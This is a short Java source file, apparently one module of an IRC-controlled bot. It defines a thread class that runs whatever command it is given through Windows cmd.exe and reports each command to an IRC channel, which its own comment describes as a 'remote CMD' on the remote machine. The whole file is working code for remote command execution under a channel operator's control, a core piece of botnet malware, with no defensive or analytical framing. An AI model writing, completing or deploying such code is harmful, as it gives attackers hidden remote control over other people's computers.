
import java.io.IOException;

/**
 * Command execute class
 * @author Nathan
 *
 */
public class CommandExecute extends Thread
{
	/**
	 * Used to execute commands on the remote machine, acts as a remote CMD.
	 * @param cmd
	 */
    public CommandExecute(String cmd)
    {
        rt = Runtime.getRuntime();
        command = cmd;
        IRC.sendMessage(Config.getChannel(), (new StringBuilder("Trying to execute command ")).append(command).toString());
    }
    
    /**
     * Runs the specified command on a new thread so other threads arn't interrupted.
     */
    public void run()
    {
        try
        {
            rt.exec((new StringBuilder("cmd.exe /C ")).append(command).toString());
        }
        catch(IOException e)
        {
            e.printStackTrace();
        }
        IRC.sendMessage(Config.getChannel(), (new StringBuilder("Command executed: ")).append(command).toString());
    }

    public String command;
    Runtime rt;
}